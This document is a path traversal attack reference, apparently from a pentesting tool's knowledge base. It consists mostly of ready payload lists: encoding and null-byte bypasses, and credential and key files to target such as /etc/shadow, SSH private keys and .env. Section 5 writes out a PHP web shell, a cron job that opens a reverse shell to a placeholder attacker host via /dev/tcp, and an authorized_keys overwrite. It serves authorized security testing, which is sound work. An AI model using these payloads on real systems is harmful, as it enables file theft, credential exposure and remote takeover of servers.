---
id: PS-PTRAV
category: Path traversal
lab_count: 6
wstg_refs: [WSTG-INPV-04, WSTG-ATHZ-01]
---

# Path Traversal: Attack Technique Reference

Path traversal (directory traversal) allows an attacker to read arbitrary files on the server by manipulating file path parameters. The attacker uses `../` sequences or other techniques to escape the intended directory and access files elsewhere on the filesystem. In severe cases, it can also allow arbitrary file writing.

---

## 1. Detection

### 1A. Identify Vulnerable Parameters

Look for any parameter that references a file or path:

- File parameters: `file=`, `filename=`, `filepath=`, `path=`, `name=`
- Image/document loading: `img=`, `image=`, `doc=`, `document=`, `page=`
- Include/template: `include=`, `template=`, `view=`, `layout=`
- Download endpoints: `download=`, `attachment=`, `resource=`
- Language/locale: `lang=`, `locale=`, `language=`
- URL path segments: `/loadImage?filename=218.png`, `/download/report.pdf`

### 1B. Basic Detection Test

Inject a traversal sequence targeting a known file:

```
# Linux
filename=../../../etc/passwd
filename=....//....//....//etc/passwd

# Windows
filename=..\..\..\windows\win.ini
filename=....\\....\\....\\windows\\win.ini
```

### 1C. Canary-Based Detection

Use a known file that always exists and has predictable content:

```
# Linux: /etc/passwd always exists and starts with "root:"
filename=../../../etc/passwd
# Expected content starts with: root:x:0:0:

# Windows: win.ini always exists
filename=..\..\..\windows\win.ini
# Expected content contains: [fonts]
```

If the response contains the expected file content, path traversal is confirmed.

---

## 2. Techniques

### 2A. Basic Traversal

Use `../` (Unix) or `..\` (Windows) sequences to navigate up from the application's base directory to the target file.

```
# Linux/Unix
filename=../../../etc/passwd
filename=../../../etc/shadow
filename=../../../etc/hostname

# Windows
filename=..\..\..\windows\win.ini
filename=..\..\..\windows\system32\drivers\etc\hosts
```

The number of `../` sequences depends on the depth of the application's base directory. Use enough to reach the filesystem root — extra sequences at the root level are harmless.

> Lab refs: PS-PTRAV-01

### 2B. Absolute Path Bypass

When the application blocks traversal sequences (`../`) but does not validate absolute paths, provide the full filesystem path directly:

```
# Linux
filename=/etc/passwd
filename=/etc/shadow
filename=/proc/self/environ

# Windows
filename=C:\windows\win.ini
filename=C:\windows\system32\drivers\etc\hosts
```

> Lab refs: PS-PTRAV-02

### 2C. Nested Traversal (Stripped Non-Recursively)

When the application strips `../` from input once but does not apply the filter recursively, use nested sequences that collapse into valid traversals after stripping:

```
# Double traversal — after stripping ../ from ....// → ../
filename=....//....//....//etc/passwd
filename=....\/....\/....\/etc/passwd

# Triple nesting (for double-stripping)
filename=......///......///......///etc/passwd

# Mixed separators
filename=..../\..../\..../\etc/passwd
```

**How it works:** The application strips `../` from `....//`, leaving `../` which is a valid traversal sequence.

> Lab refs: PS-PTRAV-03

### 2D. Encoding Bypasses

When the application filters literal `../` strings, use URL encoding or other encodings to bypass the check:

**Single URL encoding:**
```
filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
filename=%2e%2e/%2e%2e/%2e%2e/etc/passwd
filename=..%2f..%2f..%2fetc%2fpasswd
filename=..%2f..%2f..%2fetc/passwd
```

**Double URL encoding:**
```
filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
filename=..%252f..%252f..%252fetc/passwd
```

**Overlong UTF-8 encoding:**
```
filename=..%c0%af..%c0%af..%c0%afetc/passwd
filename=..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
```

**Mixed encoding:**
```
filename=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
filename=%2e%2e%c0%af%2e%2e%c0%af%2e%2e%c0%afetc%c0%afpasswd
```

**Windows-specific:**
```
filename=..%5c..%5c..%5cwindows%5cwin.ini           # %5c = \
filename=..%255c..%255c..%255cwindows%255cwin.ini     # double-encoded \
```

> Lab refs: PS-PTRAV-04

### 2E. Base Path Validation Bypass

When the application validates that the path starts with an expected base directory, include the base directory and then traverse out of it:

```
# If the application expects paths starting with /var/www/images/
filename=/var/www/images/../../../etc/passwd

# If the expected base is /home/user/uploads/
filename=/home/user/uploads/../../../etc/passwd

# Discovery: look at normal requests to learn the expected base path
# Normal: filename=images/photo.jpg → base is likely /var/www/images/
# Payload: filename=/var/www/images/../../../etc/passwd
```

> Lab refs: PS-PTRAV-05

### 2F. Null Byte Termination

When the application appends a file extension (e.g., `.png`) to your input, use a null byte to terminate the string before the extension is added:

```
# Application code: open(user_input + ".png")
# Without null byte: opens ../../../etc/passwd.png (fails)
# With null byte: opens ../../../etc/passwd (succeeds)

filename=../../../etc/passwd%00
filename=../../../etc/passwd%00.png
filename=../../../etc/passwd%00.jpg
filename=../../../etc/passwd\0.png
```

**Note:** Null byte injection works on older server platforms (PHP < 5.3.4, some Java versions). Modern frameworks are generally not vulnerable to this.

> Lab refs: PS-PTRAV-06

---

## 3. Target Files

### 3A. Linux/Unix

| File | Contents / Purpose |
|------|--------------------|
| `/etc/passwd` | User accounts (always exists, best for confirmation) |
| `/etc/shadow` | Password hashes (requires root) |
| `/etc/hosts` | Host-to-IP mappings |
| `/etc/hostname` | System hostname |
| `/etc/os-release` | OS distribution info |
| `/etc/issue` | Login banner |
| `/proc/self/environ` | Environment variables (may contain secrets) |
| `/proc/self/cmdline` | Current process command line |
| `/proc/self/status` | Process status |
| `/proc/self/fd/0` | Standard input |
| `/proc/version` | Kernel version |
| `/proc/net/tcp` | Active TCP connections |
| `/proc/net/arp` | ARP table |
| `/var/log/apache2/access.log` | Apache access log |
| `/var/log/nginx/access.log` | Nginx access log |
| `/var/log/auth.log` | Authentication log |
| `/home/<user>/.ssh/id_rsa` | SSH private key |
| `/home/<user>/.ssh/authorized_keys` | Authorized SSH keys |
| `/home/<user>/.bash_history` | Bash command history |
| `/root/.bash_history` | Root command history |
| `/etc/nginx/nginx.conf` | Nginx configuration |
| `/etc/apache2/apache2.conf` | Apache configuration |
| `/etc/mysql/my.cnf` | MySQL configuration |
| `/var/www/html/.env` | Application environment variables |
| `/var/www/html/config.php` | PHP application config |
| `/var/www/html/wp-config.php` | WordPress database credentials |

### 3B. Windows

| File | Contents / Purpose |
|------|--------------------|
| `C:\windows\win.ini` | Windows INI (always exists, best for confirmation) |
| `C:\windows\system32\drivers\etc\hosts` | Host-to-IP mappings |
| `C:\windows\system32\config\SAM` | User password hashes (requires SYSTEM) |
| `C:\windows\system32\config\SYSTEM` | System registry hive |
| `C:\windows\system.ini` | System configuration |
| `C:\boot.ini` | Boot configuration (older Windows) |
| `C:\inetpub\wwwroot\web.config` | IIS configuration (may contain connection strings) |
| `C:\inetpub\logs\LogFiles\` | IIS logs |
| `C:\windows\debug\NetSetup.log` | Network setup log |
| `C:\windows\repair\SAM` | Backup SAM file |
| `C:\Users\<user>\Desktop\` | User desktop files |
| `C:\Users\<user>\.ssh\id_rsa` | SSH private key |
| `C:\ProgramData\MySQL\data\` | MySQL data directory |
| `C:\xampp\apache\conf\httpd.conf` | XAMPP Apache config |
| `C:\xampp\mysql\data\mysql\user.MYD` | XAMPP MySQL users |

### 3C. Application-Specific Files

```
# Source code (relative to web root)
../../../app.py
../../../server.js
../../../pom.xml
../../../package.json
../../../requirements.txt
../../../Gemfile
../../../.git/config
../../../.git/HEAD
../../../.env
../../../config/database.yml
../../../config/secrets.yml
```

---

## 4. Payload Variants

### 4A. Progressive Bypass Escalation

Start with the simplest payload and escalate if blocked:

```
# Level 0: Basic traversal
../../../etc/passwd

# Level 1: Absolute path (if ../ is blocked)
/etc/passwd

# Level 2: Nested traversal (if ../ is stripped once)
....//....//....//etc/passwd

# Level 3: URL encoding (if ../ literal is blocked)
..%2f..%2f..%2fetc%2fpasswd

# Level 4: Double URL encoding (if single encoding is decoded and blocked)
..%252f..%252f..%252fetc%252fpasswd

# Level 5: Overlong UTF-8
..%c0%af..%c0%af..%c0%afetc/passwd

# Level 6: Base path + traversal (if path must start with expected dir)
/var/www/images/../../../etc/passwd

# Level 7: Null byte + extension (if extension is appended)
../../../etc/passwd%00.png

# Level 8: Mixed encoding + nesting
....%2f/....%2f/....%2f/etc/passwd

# Level 9: Backslash variants (Windows or mixed handling)
..\/..\/..\/etc/passwd
..%5c..%5c..%5cetc%5cpasswd
```

### 4B. Separator Variants

```
# Forward slash (standard Unix)
../../../etc/passwd

# Backslash (Windows)
..\..\..\windows\win.ini

# Mixed separators
..\../..\/etc/passwd
../..\../etc/passwd

# URL-encoded separators
..%2f..%2f..%2fetc%2fpasswd
..%5c..%5c..%5cwindows%5cwin.ini
```

### 4C. Depth Variants

When unsure of the base directory depth, try increasing depths:

```
filename=etc/passwd
filename=../etc/passwd
filename=../../etc/passwd
filename=../../../etc/passwd
filename=../../../../etc/passwd
filename=../../../../../etc/passwd
filename=../../../../../../etc/passwd
filename=../../../../../../../etc/passwd
filename=../../../../../../../../etc/passwd
filename=../../../../../../../../../etc/passwd
```

---

## 5. File Write via Path Traversal

When the application allows file uploads with controllable file paths, writing arbitrary files may be possible:

```
# Overwrite application config
POST /upload
filename=../../../var/www/html/.htaccess
Content: malicious .htaccess rules

# Write web shell
POST /upload
filename=../../../var/www/html/shell.php
Content: <?php system($_GET['cmd']); ?>

# Overwrite cron jobs
POST /upload
filename=../../../etc/cron.d/reverse-shell
Content: * * * * * root bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'

# Overwrite SSH authorized_keys
POST /upload
filename=../../../root/.ssh/authorized_keys
Content: ssh-rsa AAAA... attacker@machine
```

---

## 6. Quick Reference: Path Traversal Payloads

### Confirmation Payloads (Linux)

```
../../../etc/passwd
....//....//....//etc/passwd
/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%afetc/passwd
/var/www/images/../../../etc/passwd
../../../etc/passwd%00.png
```

### Confirmation Payloads (Windows)

```
..\..\..\windows\win.ini
....\\....\\....\\windows\\win.ini
C:\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
..%255c..%255c..%255cwindows%255cwin.ini
```

### High-Value Target Files

```
/etc/passwd                           # User list
/proc/self/environ                    # Env vars (secrets)
/home/<user>/.ssh/id_rsa             # SSH private key
/var/www/html/.env                    # App secrets
.git/config                           # Git config
../../../.env                         # Application secrets
```
## Rynix workflow

1. `get_technique_guide` for `path-traversal` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `record_finding`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `record_finding`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

